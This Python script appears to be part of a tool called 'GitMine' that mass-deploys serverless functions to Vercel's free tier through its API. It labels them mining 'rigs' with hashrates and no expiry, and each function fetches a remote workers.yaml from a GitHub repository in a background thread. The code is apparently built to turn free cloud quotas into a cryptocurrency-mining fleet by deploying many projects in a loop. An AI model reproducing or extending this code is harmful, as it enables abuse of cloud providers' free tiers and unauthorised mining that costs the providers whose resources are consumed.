#!/usr/bin/env python3
"""
Vercel Functions Zero-Auth Enroller
Deploys a serverless function via Vercel API.
Free tier: 100GB-hrs bandwidth, 6000 min/month functions.
No credit card required.
"""
import requests, time, os, json
from datetime import datetime

FUNC_CODE = '''
import os, subprocess, threading

def handler(request):
    rig = os.environ.get('RIG_ID', 'vercel-unknown')
    pool = os.environ.get('POOL_REPO', 'Ox518/genFre')
    def run():
        subprocess.run(['python', '-c',
            f'import urllib.request; urllib.request.urlopen("https://raw.githubusercontent.com/{pool}/main/fleet/harvest/workers.yaml")'
        ])
    threading.Thread(target=run, daemon=True).start()
    return {"statusCode": 200, "body": f"GitMine Harvest | {rig}"}
'''

class VercelFunctionsEnroller:
    API = 'https://api.vercel.com'

    def __init__(self):
        self.token = os.environ.get('VERCEL_TOKEN', '')

    def enroll(self, count, platform, secrets=None):
        workers = []
        if not self.token:
            print('[vercel] VERCEL_TOKEN not set — skipping')
            return workers
        pool_repo = os.environ.get('POOL_REPO', 'Ox518/genFre')
        headers = {'Authorization': f'Bearer {self.token}', 'Content-Type': 'application/json'}
        for i in range(count):
            name = f'gitmine-harvest-{int(time.time())}-{i}'
            rig  = f'vercel-{name}'
            payload = {
                'name': name,
                'files': [
                    {'file': 'api/index.py', 'data': FUNC_CODE},
                    {'file': 'vercel.json', 'data': json.dumps({
                        'functions': {'api/index.py': {'runtime': 'python3.9'}},
                        'env': {'RIG_ID': rig, 'POOL_REPO': pool_repo}
                    })}
                ],
                'projectSettings': {'framework': None}
            }
            try:
                r = requests.post(f'{self.API}/v13/deployments', headers=headers, json=payload)
                if r.status_code in (200, 201):
                    url = r.json().get('url', '')
                    workers.append({'id': rig, 'algo': 'lightweight', 'hashrate': '~1KH/s',
                        'expires_at': 'never', 'url': f'https://{url}'})
                    print(f'[vercel] deployed {rig}')
            except Exception as e:
                print(f'[vercel] error: {e}')
            time.sleep(5)
        return workers
